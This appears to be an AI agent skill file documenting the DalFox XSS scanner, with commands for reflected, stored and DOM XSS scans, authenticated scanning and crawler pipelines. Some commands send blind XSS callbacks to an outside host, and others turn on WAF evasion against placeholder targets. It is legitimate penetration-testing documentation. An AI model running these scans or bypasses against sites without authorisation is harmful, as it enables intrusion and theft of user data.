---
name: dalfox-xss
description: "Scan for XSS vulnerabilities with DalFox. Use when you need to detect reflected, stored or DOM XSS, analyze parameter injection points, or bypass WAF. DalFox supports automatic parameter analysis, DOM mining, Blind XSS callbacks, WAF evasion, and automatic PoC generation. This skill applies to any XSS vulnerability detection, parameter testing, or WAF bypass scenario"
zh-signals: "使用 DalFox 进行 XSS 漏洞扫描，覆盖反射型/存储型/DOM XSS、参数分析、WAF 绕过与 Blind XSS 回调。信号:DalFox,XSS扫描,WAF绕过,DOM,Blind XSS,PoC"
when-to-use: "Use when detecting reflected, stored, or DOM XSS, analyzing parameter injection points, or bypassing WAF with DalFox against authorized targets."
metadata:
  tags: "dalfox,xss,scan,XSS scanning,reflected,stored,DOM,WAF bypass,Blind XSS,parameter analysis,PoC"
  category: "tool"
---

# DalFox XSS Vulnerability Scanning Methodology

DalFox is a professional XSS vulnerability scanner. Core advantages: **smart parameter analysis** (automatically identifies injectable parameters) + **DOM mining** + **WAF evasion** + **Blind XSS support**.

Project address: https://github.com/hahwul/dalfox

## Phase 1: Basic Scanning

```bash
# Scan a single URL (with parameters)
dalfox url "http://target.com/search?q=test"

# Batch scan from a file
dalfox file urls.txt

# Pipe from stdin
cat urls.txt | dalfox pipe

# Quiet output (only show findings)
dalfox url "http://target.com/search?q=test" --silence
```

## Phase 2: Advanced Scanning

```bash
# Blind XSS (specify the callback address)
dalfox url "http://target.com/form?input=test" \
  --blind "https://your-callback.xss.ht"

# Enable WAF evasion
dalfox url "http://target.com/search?q=test" --waf-evasion

# Enable DOM analysis
dalfox url "http://target.com/page" --mining-dom

# Custom payload file
dalfox url "http://target.com/search?q=test" \
  --custom-payload payloads.txt

# POST request
dalfox url "http://target.com/submit" \
  --data "name=test&comment=hello" --method POST
```

## Phase 3: Authentication and Customization

```bash
# With a cookie
dalfox url "http://target.com/search?q=test" \
  --cookie "session=abc123"

# Custom header
dalfox url "http://target.com/search?q=test" \
  --header "Authorization: Bearer token"

# Use a proxy
dalfox url "http://target.com/search?q=test" \
  --proxy http://127.0.0.1:8080

# Control concurrency and delay
dalfox url "http://target.com/search?q=test" \
  --worker 10 --delay 100
```

## Phase 4: Pipeline Integration

```bash
# Crawler → XSS scan
katana -u http://target.com -jc -silent | dalfox pipe --silence

# Parameter discovery → XSS scan
cat urls.txt | gau | grep "=" | dalfox pipe --silence

# URL collection → deduplication → XSS scan
gau target.com | grep "=" | sort -u | dalfox pipe --silence

# JSON output
dalfox url "http://target.com/search?q=test" --format json -o results.json
```

## Common Scenario Quick Reference

| Scenario | Command |
|------|------|
| Single URL quick scan | `dalfox url "http://target/search?q=test"` |
| Batch scan | `dalfox file urls.txt --silence` |
| Blind XSS | `dalfox url "URL" --blind "https://callback.xss.ht"` |
| WAF evasion | `dalfox url "URL" --waf-evasion` |
| Pipeline scan | `cat urls.txt \| dalfox pipe --silence` |
